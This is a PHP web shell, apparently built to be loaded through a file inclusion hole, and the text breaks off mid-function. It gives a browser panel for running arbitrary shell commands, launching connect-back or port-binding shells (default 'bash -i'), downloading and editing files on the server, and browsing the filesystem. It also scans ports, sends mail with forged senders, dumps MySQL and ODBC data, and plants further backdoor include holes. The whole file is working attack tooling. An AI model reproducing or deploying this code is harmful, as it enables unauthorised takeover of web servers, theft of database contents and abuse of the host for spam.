<?php
######################################################################
# we decide if we want syslogging
closelog();
######################################################################
# define variables
######################################################################

# error_reporting(E_ALL);
error_reporting(0);

# get globals even if register_globals is off
import_globals();

$safe_mode = ini_get('safe_mode');
$register_globals = ini_get('register_globals');
$magic_quotes_gpc = ini_get('magic_quotes_gpc');
$txt['en']['on']="on";
$txt['en']['off']="off";
$txt['de']['on']="an";
$txt['de']['off']="aus";
$lang="en";

if($safe_mode == 1) $SM = $txt[$lang]['on'];
else { 
	$SM = $txt[$lang]['off'];
	# set_time_limit(9000);
}
if($register_globals == 1) $RG = $txt[$lang]['on'];
else $RG = $txt[$lang]['off'];
if($magic_quotes_gpc == 1) $MQ = $txt[$lang]['on'];
else $MQ = $txt[$lang]['off'];

# navigatable functions
$ArrFuncs = array(
	"dropinc"	=> 0,
	"filecopy"	=> 0,
	"fileedit"	=> 0,
	"showsource"	=> 0,
	"snoop"		=> 0,
	"cmdln"		=> 0,
	"connectback"	=> 0,
	"phpshell"	=> 0,
	"servicecheck"	=> 0,
	"mysqlaccess"	=> 0,
	"mail"		=> 0,
	"env"		=> 0,
	"phpenv"	=> 0,
	"phpinfo"	=> 0,
	"dumpvars"	=> 0,
	"debugscript"	=> 0,
	"syslog"	=> 0
);

# init navigation
foreach($ArrFuncs as $key => $val) if(!isset($$key)) $$key = $val;



# set default values
$ArrDefaults = array(
	"filecopy_source" => "http://...",
	"filecopy_dest" => getcwd(),
	"cmdcall" => "",
	"editfile" => getcwd(),
	"editcontent" => "",
	"chdir" => ".",
	"vsource" => $SCRIPT_FILENAME,
	"mail_from" => "attacker@0wned.org",
	"mail_to" => "",
	"mail_subject" => "", 
	"mail_attach_source"  => "http://....",
	"mail_attach_appear"  => "filename...",
	"mail_content_type"   => "image/png",
	"mail_msg" => "",
	"tcpports" => "21 22 23 25 80 110",
	"timeout" => 5,
	"miniinc_loc" => getcwd() . "/miniinc.php",
	"incdbhost" => "localhost",
	"cbhost" => $_SERVER['REMOTE_ADDR'],
	"cbport" => 20202,
	"cbtempdir" => "/tmp",
	"cbcompiler" => "gcc",
	"phpshellapp" => "export TERM=xterm; bash -i",
	"phpshellhost" => "0.0.0.0",
	"phpshellport" => "20202"
);

# init defaults
foreach($ArrDefaults as $key => $val) if(!isset($$key)) $$key = $val;

# define executable functions
$Mstr = array(
	0 => "No execute functions available!",
	1 => "passthru()",
	2 => "system()",
	3 => "backticks",
	4 => "proc_open()",
	5 => "exec()"
);

# clean request to avoid uri monster
$SREQ = "";
$reqdat = array();
$tmpCount=0;
foreach($REQUESTS as $key => $val){
	if($tmpCount==0) $reqdat[] = $key."=".$val;
	else if($val!=0 || $val!="" || $val!="0") $reqdat[] = $key."=".$val;
	$tmpCount++;
}
$SREQ = implode("&", $reqdat);
$tmpCount=0;
if($SREQ=="") {
	$tmp_req = array();
	$tmp_qry = explode("&", $QUERY_STRING);
	foreach($tmp_qry as $key => $val) {
		$tmp_val = explode("=", $val);
		if($tmpCount==0) $tmp_req[] = $tmp_val[0]."=".$tmp_val[1];
		else if($tmp_val[1]!=0 || $tmp_val[1]!="" || $tmp_val[1]!="0") $tmp_req[] = $tmp_val[0]."=".$tmp_val[1];
		$tmpCount++;
	}
	$SREQ = implode("&", $tmp_req);
}

if(isset($path['docroot'])) $SREQ .= "&path[docroot]=" . $path['docroot'];

# set some defaults to avaoid errors
$is_file   = array();
$is_dir    = array();
$is_w_dir  = array();
$is_w_file = array();
$emeth=0;
if($chdir!="/" && strlen($chdir) < 2) $chdir = getcwd() . "/";
$chdir = str_replace("//", "/", $chdir);
if(substr($chdir, -1) != "/") $chdir .= "/";
##
# Setup wether to use PHP_SELF or SCRIPT_NAME
if($PHP_SELF!=$SCRIPT_NAME) $MyLoc = $PHP_SELF;
else $MyLoc = $SCRIPT_NAME;

# $MyLoc = "http://" . $_SERVER['HTTP_HOST'] . $MyLoc;
$MyLoc = "http://" . $SERVER_NAME . ":" . $SERVER_PORT . $MyLoc;

# This is a list of internal inc.inc vars that do not get displayed 
# inside the dumpvars function (poss for a debug func later?)
$DebugArr = array(
	'ARHGFDGFGASDFG',
	'safe_mode',
	'register_globals',
	'magic_quotes_gpc',
	'txt',
	'lang',
	'SM',
	'RG',
	'MQ',
	'ArrFuncs',
	'val',
	'key',
	'env',
	'phpenv',
	'phpinfo',
	'debugscript',
	'filecopy',
	'fileedit',
	'showsource',
	'snoop',
	'mail',
	'cmdln',
	'syslog',
	'servicecheck',
	'dropinc',
	'mysqlaccess',
	'ArrDefaults',
	'filecopy_source',
	'filecopy_dest',
	'cmdcall',
	'editfile',
	'editcontent',
	'chdir',
	'vsource',
	'mail_from',
	'mail_to',
	'mail_subject',
	'mail_attach_source',
	'mail_attach_appear',
	'mail_content_type',
	'mail_msg',
	'tcpports',
	'timeout',
	'miniinc_loc',
	'incdbhost',
	'Mstr',
	'SREQ',
	'reqdat',
	'tmpCount',
	'is_file',
	'is_dir',
	'is_w_dir',
	'is_w_file',
	'emeth',
	'MyLoc',
	'dumpvarsare',
	'DebugArr',
	'cbtempdir',
	'cbcompiler',
	'cbhost',
	'cbport',
	'phpshelltype',
	'phpshellapp',
	'phpshellhost',
	'phpshellport'
);


# activate syslog entry
if($syslog == 1)
{
#	openlog("# XSS $SCRIPT_URI #", LOG_PID | LOG_PERROR, LOG_LOCAL0);
#	drop_syslog_warning("Q: $QUERY_STRING :: R: $REMOTE_ADDR ($HTTP_USER_AGENT)");
}
###############################################################################
#
# start include output 
#
###############################################################################
$strOutput = "";
$strOutput .= "<html><body bgcolor='#ffffff'>
<table border=3 bgcolor=#aaaaaa width='100%'><tr><td><font color='#000000'>
<center>
<h2>Include tool</h2>
PHP Version: " . phpversion() . " | 
safe_mode: $SM |
register_globals: $RG | 
magic_quotes_gpc: $MQ | 
syslogging: ";
if($syslog == 1) $strOutput .= $txt[$lang]['off']; else $strOutput .= $txt[$lang]['on'];
$strOutput .= "
<br><br>
</center>
<font color='#000000'>";
foreach($ArrFuncs as $key => $val) $strOutput .= make_switch($key); 

###############################################################################
# test cmd shell environment
###############################################################################
if($env == 1) { 
	$strOutput .= "
	<table border=1><tr><td colspan=2><h3>cmd infos</h3></td></tr>
	<tr><td>test using pwd</td><td>"; $emeth =& test_cmd_shell(); $strOutput .= "</td></tr>";
	if($emeth==0) { 
		$strOutput .= "<tr><td colspan=2>$Mstr[$emeth]</td></tr>";
	} else {
		$strOutput .= "<tr><td>exec method</td><td>$Mstr[$emeth]</td><tr>
		<tr><td>uname -a</td><td>" . Mexec("uname -a", $emeth) . "</td><tr>
		<tr><td>id</td><td>" . Mexec("id", $emeth) . "</td><tr>
		</table>";
	}
}

###############################################################################
# test php environment
###############################################################################
if($phpenv == 1) { 
	$strOutput .= "<table border=1><tr><td colspan=2><h3>php short infos</h3></td></tr>
		<tr><td colspan=2>posix infos</td><tr>";
		if(function_exists('posix_uname')) {
			$posix_uname = posix_uname();
			while (list($info, $value) = each ($posix_uname)) {
				$strOutput .= "<tr><td>$info</td><td>$value</td></tr>";
			}
		} else {
			$strOutput .= "posix_uname not available";
		}
		$strOutput .= "<tr><td>current script user</td><td>" . get_current_user() . "</td><tr>";
		if(function_exists('posix_getuid')) $strOutput .= "<tr><td>getuid</td><td>" . posix_getuid() . "</td><tr>";
		else $strOutput .= "posix_getuid not available";
		if(function_exists('posix_geteuid')) $strOutput .= "<tr><td>geteuid</td><td>" . posix_geteuid() . "</td><tr>";
		else $strOutput .= "posix_geteuid not available";
		if(function_exists('posix_getgid')) $strOutput .= "<tr><td>getgid</td><td>" . posix_getgid() . "</td><tr>";
		else $strOutput .= "posix_getgid not available";
	$strOutput .= "</table>";
}


###############################################################################
# dump variables
###############################################################################
if($dumpvars == 1) {
	$strOutput .= "<table border=1><tr><td><h3>dump variables</h3></td></tr>
	<tr><td>" . dd("GLOBALS") . "</td></tr>
	</table>";
}
###############################################################################
# dump variables (DEBUG SCRIPT) NEEDS MODIFINY FOR B64 STATUS!!
###############################################################################
if($debugscript == 1) { ?>
	<table border=1><tr><td><h3>debug script</h3></td></tr>
	<tr><td>
	<? ddb("DebugArr"); ?>
	</td></tr>
	</table>
<? }
###############################################################################
# copy file
###############################################################################
if($filecopy == 1) { 
	$strOutput .= "<table border=1><tr><td colspan=2><h3>copy file</h3></td></tr>
	<form method='post' target='_parent' action=" . $MyLoc . "?" . $SREQ . "&'>
	<tr><td>source</td><td><input type=text name='filecopy_source' value='" . $filecopy_source . "'></td></tr>
	<tr><td>destination</td><td><input type=text name='filecopy_dest'  value='" . $filecopy_dest . "'></td></tr>
	<tr><td></td><td><input type=submit></td></tr>
	<tr><td colspan=2>" . copy_file($filecopy_source,$filecopy_dest) . "</td></tr>
	</form>
	</table>";
} 
###############################################################################
# edit file
###############################################################################
if($fileedit == 1) {
	$strOutput .= "<table border=1><tr><td colspan=2><h3>edit file</h3></td></tr>
	<form method='post' target='_parent' action='" . $MyLoc . "?" . $SREQ . "&'>
	<tr><td>file</td><td><input type=text name='editfile' value='" . $editfile . "'></td></tr>
	<tr><td>edit</td><td><input type='checkbox' name='edit' value='1'></td></tr>
	<tr><td>content</td><td><textarea name='editcontent' cols='50' rows='10'>"; 
	if($edit==1 | $editfile!=$ArrDefaults['editfile'])
		$strOutput .= show_file($editfile);
	$strOutput .= "</textarea></td></tr>
	<tr><td></td><td><input type=submit></td></tr>
	<tr><td colspan=2>";
	if($edit==1 | $editfile!=$ArrDefaults['editfile'])
		$strOutput .= edit_file($editcontent,$editfile,$edit);
 	$strOutput .= "</td></tr>
	</table>
	</form>";
}
###############################################################################
# execute cmd shell NEEDS MODIFINY FOR B64 STATUS!!
###############################################################################
if($cmdln == 1) {
	$emeth = test_cmd_shell();
	$strOutput .= "<table border=1><tr><td colspan=2><h3>execute cmd execution: " . $cmdcall . "</h3></td></tr>
	<form method='post' target='_parent' action='" . $MyLoc . "?" . $SREQ . "&'>
	<tr><td>cmd line</td><td><input type=text name='cmdcall' value='" . $cmdcall . "'></td></tr>
	<tr><td></td><td><input type=submit></td></tr>
	<tr><td>test method with 'pwd'</td><td>" . $Mstr[$emeth] . "</td></tr>
	<tr><td colspan=2>";
	if($emeth < 3) {
		$strOutput .= "The output of this command will be somewhere on the page!";
		Mexec($cmdcall, $emeth);
	} else {
		$strOutput .= Mexec($cmdcall, $emeth);
	}
	$strOutput .= "</td></tr>
	</form>
	</table>";
}
###############################################################################
# sending mime mail
###############################################################################
if($mail == 1) {
	$strOutput .= "<table border=1><tr><td colspan=2><h3>sending mime mail with attachment</h3></td></tr>
	<form method='post' target='_parent' action='" . $MyLoc . "?" . $SREQ . "&'>
	<tr><td>from</td><td><input type=text name='mail_from' value='" . $mail_from . "'></td></tr>
	<tr><td>to</td><td><input type=text name='mail_to' value='" . $mail_to . "'></td></tr>
	<tr><td>subject</td><td><input type=text name='mail_subject' value='" . $mail_subject . "'></td></tr>
	<tr><td>message</td><td><textarea name='mail_msg' cols='50' rows='10'>" . $mail_msg . "</textarea></td></tr>
	<tr><td>attach file</td><td><input type=text name='mail_attach_source' value='" .$mail_attach_source . "'></td></tr>
	<tr><td>attach content type</td><td><input type=text name='mail_content_type' value='" . $mail_content_type . "'></td></tr>
	<tr><td>file to appear</td><td><input type=text name='mail_attach_appear' value='" . $mail_attach_appear . "'></td></tr>
	<tr><td></td><td><input type=submit></td></tr>
	<tr><td colspan=2>" . drop_mime_mail($mail_from,$mail_to,$mail_subject,$mail_attach_source,$mail_content_type,$mail_attach_appear,$mail_msg) . "</td></tr>
	</form>
	</table>";
}

###############################################################################
# drop mini inc handling
###############################################################################
if($dropinc == 1) { 
	if($loc!="") $miniinc_loc = $loc;
	$strOutput .= "<table border=1><tr><td colspan=2><h3>drop mini inc hole</h3></td></tr>
	<form method='post' target='_parent' action='" . $MyLoc . "?" . $SREQ . "&'>
	<tr><td>source</td><td><input type=text name='loc' value='" . $miniinc_loc . "'></td></tr>
	<tr><td>drop</td><td><input type='checkbox' name='minisave' value='1'></td></tr>
	<tr><td></td><td><input type=submit></td></tr>
	<tr><td colspan=2><pre>";
	if($minisave==1) $strOutput .= dropminiinc($miniinc_loc);
	$strOutput .= "</pre></td></tr>
	</form>
	</table>";
} 
###############################################################################
# connect C back shell handling
###############################################################################
if($connectback == 1) {
	$strOutput .= "<table border=1><tr><td colspan=2><h3>connect back shell</h3></td></tr>
	<form method='post' target='_parent' action='" . $MyLoc . "?" . $SREQ . "&'>
	<tr><td>temp dir.</td><td><input type=text name='cbtempdir' value='" . $cbtempdir . "'></td></tr>
	<tr><td>compiler</td><td><input type=text name='cbcompiler' value='" . $cbcompiler . "'></td></tr>
	<tr><td>host</td><td><input type=text name='cbhost' value='" . $cbhost . "'></td></tr>
	<tr><td>tcp port</td><td><input type=text name='cbport' value='" . $cbport . "'></td></tr>
	<tr><td>execute</td><td><input type='checkbox' name='run' value='1'></td></tr>
	<tr><td></td><td><input type=submit></td></tr>
	<tr><td colspan=2>";
	if($run == 1 && $cbtempdir && $cbcompiler && $cbhost && $cbport) $strOutput .= connect_back($cbtempdir, $cbcompiler, $cbhost, $cbport);
	$strOutput .= "</td></tr></form></table>";
}

###############################################################################
# PHP shell handling
###############################################################################
if($phpshell == 1) {
	$strOutput .= "<table border=1><tr><td colspan=2><h3>PHP shell</h3></td></tr>
	<form method='post' target='_parent' action='" . $MyLoc . "?" . $SREQ . "&'>
	<tr><td>type</td><td><select name='phpshelltype'><option value='cb'>Connect Back</option><option value='pb'>Port Binding</option></select></td></tr>
	<tr><td>shell app</td><td><input type=text name='phpshellapp' value='" . $phpshellapp . "'></td></tr>
	<tr><td>host</td><td><input type=text name='phpshellhost' value='" . $phpshellhost . "'></td></tr>
	<tr><td>tcp port</td><td><input type=text name='phpshellport' value='" . $phpshellport . "'></td></tr>
	<tr><td>execute</td><td><input type='checkbox' name='run' value='1'></td></tr>
	<tr><td></td><td><input type=submit></td></tr>
	<tr><td colspan=2>";
	if($run == 1 && $phpshellapp && $phpshellhost && $phpshellport) $strOutput .= DB_Shell($phpshelltype, $phpshellapp, $phpshellport, $phpshellhost);
	$strOutput .= "</td></tr></form></table>";
}


###############################################################################
# snooping
###############################################################################
if($snoop == 1) {
	$strOutput .= "<table border=1><tr><td colspan=2><h3>file system snooping: " . $chdir . "</h3></td></tr>
	<form method='post' target='_parent' action='" . $MyLoc . "?" . $SREQ . "&'>
	<tr><td>path</td><td><input type=text name='chdir' value='" . $chdir . "'></td></tr>
	<tr><td colspan=2>" . snoopy($chdir) . "</td></tr>
	</form>
	</table>";
}
###############################################################################
# show highlited source
###############################################################################
if(($showsource == 1) | ($vsource!=$ArrDefaults['vsource'])) {
	$strOutput .= "<table border=1><tr><td colspan=2><h3>show source: " . $vsource . "</h3></td></tr>
	<form method='post' target='_parent' action='" . $MyLoc . "?" . $SREQ . "&'>
	<tr><td>path</td><td><input type=text name='vsource' value='" . $vsource . "'></td></tr>
	<tr><td></td><td><input type=submit></td></tr>
	<tr><td colspan=2>" . highlight_file($vsource, 1) . "</td></tr>
	</form>
	</table>";
}
###############################################################################
# service check
###############################################################################
if($servicecheck == 1) {
if($servhost!="") $host = $servhost;
else $host = "localhost";

	$strOutput .= "<table border=1><tr><td colspan=2><h3>simple service check</h3></td></tr>
	<form method='post' target='_parent' action='" . $MyLoc . "?" . $SREQ . "&'>
	<tr><td>host(s)</td><td><input type=text name='servhost' value='" . $host . "'></td></tr>
	<tr><td>tcp port(s)</td><td><input type=text name='tcpports' value='" . $tcpports . "'></td></tr>
	<tr><td>timeout</td><td><input type=text name='timeout' value='" . $timeout . "'></td></tr>
	<!-- tr><td>udp port(s)</td><td><input type=text name='udpports' value='<?=$sports?>'></td></tr -->
	<tr><td></td><td><input type=submit></td></tr>
	<tr><td colspan=2><pre>";

	$hosts = explode(" ", $host);
	$port = explode(" ",$tcpports);
	$values = count($port);
	$numhosts = count($hosts);
	if($values == 1 && $port[0] != "") $strOutput .= "\nChecking 1 port..\n";
	else if($values > 1) $strOutput .= "Checking $values ports..\n";
	else $strOutput .= "No ports specified!!\n";
	if($numhosts > 1) $strOutput .= "On $numhosts hosts..\n";
	else if($numhosts == 1) $strOutput .= "On 1 host..\n";
	else $strOutput .= "No hosts specified!!\n";
	if($numhosts >= 1) {
		for($hcount=0; $hcount < $numhosts; $hcount++) {
			$tmphost = $hosts[$hcount];
			$strOutput .= "\nTesting $tmphost..\n";
			if(($values == 1 && $port[0] != "") | $values > 1) {
				for ($cont=0; $cont < $values; $cont++) {
					@$sock[$cont] = fsockopen($tmphost, $port[$cont], $oi, $oi2, $timeout);
					$service = getservbyport($port[$cont],"tcp");
					@$get = fgets($sock[$cont]);
					if(isset($get)) $strOutput .= "Port: $port[$cont] ($service) - Banner: $get \n";
					flush();
				}
			}
		}
	}
	$strOutput .= "</pre></td></tr>
	</form>
	</table>";
}
###############################################################################
# show phpinfo
###############################################################################
if($phpinfo == 1){ 
	phpinfo();
}
######################################################################
# db stuff
######################################################################
if($mysqlaccess == 1) {
	$strOutput .= "<table border=1>
	<form method='post' target='_parent' action='$MyLoc?$SREQ&'>
	<tr><td>db host</td><td><input type='text' name='incdbhost' size='10' value='$incdbhost'/></td></tr>
	<tr><td>user</td><td><input type='text' name='incdbuser' size='10' value='$incdbuser'/></td></tr>
	<tr><td>pass</td><td><input type='text' name='incdbpass' size='10' value='$incdbpass'/></td></tr>
	<tr><td>name</td><td><input type='text' name='incdbname' size='10' value='$incdbname'/></td></tr>
	<tr><td>table</td><td><input type='text' name='incdbtable' size='10' value='$incdbtable'/></td></td></tr>
	<tr><td>sql query</td><td><input type='text' name='incdbsql' size='50' value='$incdbsql'/></td></td></tr>
	<tr><td>dumpfile</td><td><input type='text' name='incdbfile' size='10' value='$incdbfile'/></td></td></tr>
	<!-- tr><td>Variables?</td><td><input type='checkbox' name='incdbvar'<? if($incdbvar!='') echo ' checked '; /></td></tr -->
	<tr><td colspan=2><input type='submit' name='submit' value='Query'/></td></tr>
	</table>";
}

if($incdbhost!="" && $incdbuser!="") {
	if($incdbvar!="") $dbh = $incdbhost;
	else $dbH = $incdbhost;
	$dbu = $incdbuser;
	$dbp = $incdbpass;
	if($incdbsql!="") $dbs = $incdbsql;
	if($incdbname!="") $dbn = $incdbname;
	if($incdbtable!="") $dbt = $incdbtable;
	if($incdbfile!="") $dumpfile = $incdbfile;
}

if(isset($dbh)) {
	$strOutput .= "<table border=1><tr><td><b>mysql access</b></td></tr>";
	eval("\$Gdbhost = \"\$$dbh\";");
	eval("\$Gdbuser = \"\$$dbu\";");
	eval("\$Gdbpass = \"\$$dbp\";");
	eval("\$Gdbname = \"\$$dbn\";");
	$strOutput .= "<tr><td>";
	if($dbn=="") {
		$strOutput .= "host=".$Gdbhost." user=".$Gdbuser." pass=".$Gdbpass .
		"</td></tr><tr><td>" .
		display_dbs($Gdbhost, $Gdbuser, $Gdbpass);
	} else if(isset($dbs)) {
		$Gdbsql = $dbs;
		$strOutput .= "host=".$Gdbhost." user=".$Gdbuser." pass=".$Gdbpass." name=".$Gdbname."<br/>sql=".$Gdbsql . 
		"</td></tr><tr><td>";
		if(isset($dumpfile)) {
			$strOutput .= dump_query($Gdbhost, $Gdbuser, $Gdbpass, $Gdbname, $Gdbsql, $dumpfile);
		} else {
			$strOutput .= display_query($Gdbhost, $Gdbuser, $Gdbpass, $Gdbname, $Gdbsql);
		}
	} else if(isset($dbt)) {
		$Gdbtabl = $dbt;
		$strOutput .= "host=".$Gdbhost." user=".$Gdbuser." pass=".$Gdbpass." name=".$Gdbname." table=".$Gdbtabl;
		if($dumpfile!="") $strOutput .= " dumpfile=" .$dumpfile;
		$strOutput .= "</td></tr><tr><td>";
		if(isset($dumpfile)) {
			$strOutput .= dump_rows($Gdbhost, $Gdbuser, $Gdbpass, $Gdbname, $Gdbtabl, $dumpfile);		
		} else {
			$strOutput .= display_rows($Gdbhost, $Gdbuser, $Gdbpass, $Gdbname, $Gdbtabl);
		}
	} else {
		$strOutput .= "host=".$Gdbhost." user=".$Gdbuser." pass=".$Gdbpass." name=".$Gdbname .
		"</td></tr><tr><td>" .
		display_tables($Gdbhost, $Gdbuser, $Gdbpass, $Gdbname);
	}
	$strOutput .= "</pre></td></tr></table><br/>";
}

if(isset($dbH)) {
	$strOutput .= "<table border=1><tr><td><b>mysql access</b></td></tr><tr><td>";
	if($dbn=="") {
		$strOutput .= "host=".$dbH." user=".$dbu." pass=".$dbp.
		"</td></tr><tr><td>".
		display_dbs($dbH, $dbu, $dbp);
	} else if(isset($dbs)) {
		$strOutput .= "host=".$dbH." user=".$dbu." pass=".$dbp." name=".$dbn."<br/>sql=".$dbs.
		"</td></tr><tr><td>";
		if(isset($dumpfile)) {
			$strOutput .= dump_query($dbH, $dbu, $dbp, $dbn, $dbs, $dumpfile);
		} else {
			$strOutput .= display_query($dbH, $dbu, $dbp, $dbn, $dbs);
		}
	} else if(isset($dbt)) {
		$strOutput .= "host=".$dbH." user=".$dbu." pass=".$dbp." name=".$dbn." table=".$dbt;
		if($dumpfile!="") $strOutput .= " dumpfile=" .$dumpfile;
		$strOutput .= "</td></tr><tr><td> ";
		if(isset($dumpfile)) {
			$strOutput .= dump_rows($dbH, $dbu, $dbp, $dbn, $dbt, $dumpfile);		
		} else {
			$strOutput .= display_rows($dbH, $dbu, $dbp, $dbn, $dbt);
		}
	} else {
		$strOutput .= "host=".$dbH." user=".$dbu." pass=".$dbp." name=".$dbn .
		"</td></tr><tr><td>" .
		display_tables($dbH, $dbu, $dbp, $dbn);
	}
	$strOutput .= "</pre></td></tr></table><br/>";
}

if(isset($Odbh)) {
	$strOutput .= "<table border=1><tr><td><b>odbc access</b></td></tr>";
	eval("\$Gdbhost = \"\$$Odbh\";");
	eval("\$Gdbuser = \"\$$dbu\";");
	eval("\$Gdbpass = \"\$$dbp\";");
	eval("\$Gdbname = \"\$$dbn\";");
	$strOutput .= "<tr><td>";
	if(isset($dbt)) {
		$Gdbtabl = $dbt;
		$strOutput .= "host=".$Gdbhost." user=".$Gdbuser." pass=".$Gdbpass." name=".$Gdbname." table=".$Gdbtabl .
		"</td></tr><tr><td>" .
		display_rows($Gdbhost, $Gdbuser, $Gdbpass, $Gdbname, $Gdbtabl);
	} else {
		$strOutput .= "host=".$Gdbhost." user=".$Gdbuser." pass=".$Gdbpass .
		"</td></tr><tr><td> " .
		Odisplay_tables($Gdbhost, $Gdbuser, $Gdbpass);
	}
	$strOutput .= "</pre></td></tr></table><br/>";
}

if(isset($OdbH)) {
	$strOutput .= "<table border=1><tr><td><b>odbc access</b></td></tr><tr><td>";
	if(isset($dbt)) {
		$strOutput .= "host=".$dbH." user=".$dbu." pass=".$dbp." name=".$dbn." table=".$dbt .
		"</td></tr><tr><td> " .
		Odisplay_rows($OdbH, $dbu, $dbp, $dbn, $dbt);
	} else {
		$strOutput .= "host=".$dbH." user=".$dbu." pass=".$dbp .
		"</td></tr><tr><td> " .
		Odisplay_tables($OdbH, $dbu, $dbp);
	}
	$strOutput .= "</pre></td></tr></table><br/>";
}


$strOutput .= "</font></td></tr></table>";
$strOutputB64 = chunk_split(base64_encode($strOutput));
echo "</div></div></div></div></div></div></div></div></div></div>\n";
echo '<iframe width="100%" height="100%" style="border:0; position: absolute; left: 0px; top: 0px;" src="data:text/html;base64,' . $strOutputB64 .'">';

######################################################################
#
# functions
#
######################################################################
# make globals avail
function import_globals()  
{
	global $HTTP_SERVER_VARS;
	global $REMOTE_ADDR;  
	global $PHP_SELF;
	global $REQUESTS;
	global $SCRIPT_FILENAME;
	global $QUERY_STRING;
	global $SCRIPT_URI;
	global $SERVER_NAME;
	$_igr = ini_get('register_globals');
	if ($_igr == '' OR $_igr == 'Off' OR $_igr == 0) import_request_variables('GPC');
	if (phpversion() <= '4.1.0') {
		$REQUESTS = array_merge($HTTP_GET_VARS, $HTTP_POST_VARS); 
	} else {
		$REQUESTS = $_REQUEST;
	}
	if($_SERVER['PHP_SELF']=="") {
		$SERVER_NAME     = $HTTP_SERVER_VARS['SERVER_NAME'];
		$SCRIPT_URI      = $HTTP_SERVER_VARS['SCRIPT_URI'];
		$REMOTE_ADDR     = $HTTP_SERVER_VARS['REMOTE_ADDR'];
		$QUERY_STRING    = $HTTP_SERVER_VARS['QUERY_STRING'];
		$PHP_SELF        = $HTTP_SERVER_VARS['PHP_SELF'];
		$SCRIPT_FILENAME = $HTTP_SERVER_VARS['SCRIPT_FILENAME'];
	} else {
		$SERVER_NAME     = $_SERVER['SERVER_NAME'];
		$SCRIPT_URI      = $_SERVER['SCRIPT_URI'];
		$REMOTE_ADDR     = $_SERVER['REMOTE_ADDR'];
		$QUERY_STRING    = $_SERVER['QUERY_STRING'];
		$PHP_SELF        = $_SERVER['PHP_SELF'];
		$SCRIPT_FILENAME = $_SERVER['SCRIPT_FILENAME'];
	}
}

function dd($v) {
	global $DebugArr;
	$rv = "<blockquote>\n";
	$q="while(list(\$key,\$val) = each(\$$v)) {".
	' if(array_search($key, $DebugArr)) {'.
	' } else if((is_array($val)) && ($key!="GLOBALS")) {'.
	'  echo "<b>$key</b>>><br/>";'.
	'  @dd($v."[".$key."]");'.
	' } else if($key=="GLOBALS") {'.
	' } else echo "<b>$key</b>=>$val<br/>";'.
	'};';
	eval($q);
	echo "</blockquote>\n";
}

function ddb($v) {
	echo "<blockquote>\n";
	$q="while(list(\$key,\$val) = each(\$$v)) {".
	' if((is_array($val)) && ($key!="GLOBALS")) {'.
	'  echo "<b>$key</b>>><br/>";'.
	'  @dd($v."[".$key."]");'.
	' } else if($key=="GLOBALS") {'.
	' } else echo "<b>$key</b>=>$val<br/>";'.
	'};';
	eval($q);
	echo "</blockquote>\n";
}

######################################################################
# cmd shell functions
######################################################################
# test what cmd is working
function test_cmd_shell(){
	if(strlen(Mexec("pwd", 5))>11)     $var = 5;
	elseif(strlen(Mexec("pwd", 4))>11) $var = 4;
	elseif(strlen(Mexec("pwd", 3))>11) $var = 3;
	elseif(strlen(Mexec("pwd", 2))>0) $var = 2;
	elseif(strlen(Mexec("pwd", 1))>0) $var = 1;
	else $var = 0;
	return $var;
}
# function for executing cmds
function Mexec($Mcmd, $type) {
	if($Mcmd != ""){
		$dspec = array(
			0 => array("pipe", "r"),
			1 => array("pipe", "w"),
			2 => array("pipe", "r")
		);
		$output = "";
		switch($type) {
			case 5:
				$output .= "<pre>";
				$lastline = exec($Mcmd, $arrOutput);
				foreach($arrOutput as $val) {
					$output .= $val . "\n";
				}
				$output .= "</pre>";
				break;
			case 4:
				$proc = proc_open($Mcmd, $dspec, $pipes);
				if (is_resource($proc)) {
					$output .= "<pre>";
					fclose($pipes[0]);
					while(!feof($pipes[1])) {
						$tmp = fgets($pipes[1], 1024);
						$output .= $tmp;
					}
					$output .= "</pre>";
				}
				break;
			case 3;
				$output .= "<pre>";
				$output .= `$Mcmd`;
				$output .= "</pre>";
				break;
			case 2;
				print "<pre>\n";
				$output = system($Mcmd);
				print "</pre>\n";
				break;
			case 1;
				print "<pre>\n";
				$output = passthru($Mcmd);
				print "</pre>\n";
				break;
			case 0;
			default;
				$output = "There are no execute functions available!";
				break;
		}
		return $output;
	}	
}
function drop_mime_mail($from,$to,$subject,$attach_source,$content_type,$attach_appear,$msg) {
	$msgerror = "";
	if($msg == "") $msgerror = "please enter a message";
	elseif($subject == "") $msgerror = "please enter a subject";
	else {
		$stlf = md5(uniqid(time())); 
		$attach = "";
		$fp = fopen($attach_source, "rb"); 
		if($fp) while(!feof($fp)) { $attach = $attach . fread($fp, 1024); } 
		$header = "From: $from\n"; 
		$header .= "MIME-Version: 1.0\n"; 
		$header .= "Content-Type: multipart/mixed; boundary=$stlf\n\n"; 
		$header .= "This is a multi-part message in MIME format\n"; 
		$header .= "--$stlf\n"; 
		$header .= "Content-Type: text/plain\n"; 
		$header .= "Content-Transfer-Encoding: 8bit\n\n"; 
		$header .= "$msg\n"; 
		$header .= "--$stlf\n"; 
		$header .= "Content-Type: $content_type; name=$attach_appear\n"; 
		$header .= "Content-Transfer-Encoding: base64\n"; 
		$header .= "Content-Disposition: attachment; filename=$attach_appear\n\n"; 
		$header .= chunk_split(base64_encode($attach)); 
		$header .= "\n"; 
		$header .= "--$stlf--"; 
		mail($to,$subject,"",$header); 
		$msgerror = "send done - show header: <br>\n<pre>$header</pre> ";
	} 
	return $msgerror;
}

######################################################################
# system browsing
######################################################################

function make_switch($val){
	global $txt;
	global $lang;
	global $SCRIPT_NAME,$SREQ,$_REQUEST,$MyLoc,$_SERVER;
	if(isset($_REQUEST[$val]) AND $_REQUEST[$val] == 1) { $test = 0; $col = "green"; $sw = $txt[$lang]['off']; }
	else { $test = 1; $col = "black"; $sw = $txt[$lang]['on']; }
	return " <font color=$col>$val</font> <a target=\"_parent\" href=\"".$MyLoc."?".$SREQ."&".$val."=".$test."\">[ ". $sw." ]</a> ";
}
function drop_syslog_warning($msg) {
	global $syslog;
#	if($syslog == 1) syslog(LOG_WARNING,$msg);
}

######################################################################
# file functions
######################################################################
function copy_file($source,$dest) {
	$dataout = "";
	if($source == "")  $dataout .= "enter source<br>\n";
	if($dest != "") {
		ini_set("user_agent","m0ins downloader");
		if(!copy($source, $dest)) $dataout . "failed to copy ...<br>\n";
		if(file_exists($dest)) $dataout .= highlight_file($dest, 1);
	} else {
		$dataout .= "enter destination";
	}
}
function edit_file($cont,$dest,$do) {
	$dataout = "";
	global $magic_quotes_gpc;
	if(file_exists($dest)) {
		if($do == 1){
			$fh = fopen($dest, "w");		
			if(!$fh) {
				$dataout .= "unable to open <b>$dest</b>.\n";
			} else {
#				$cont = str_replace("&gt;", ">", str_replace("&lt;", "<", $cont));
				if($magic_quotes_gpc == 1) $cont = stripslashes($cont);
				$write = fwrite($fh, $cont);
				fclose($fh);
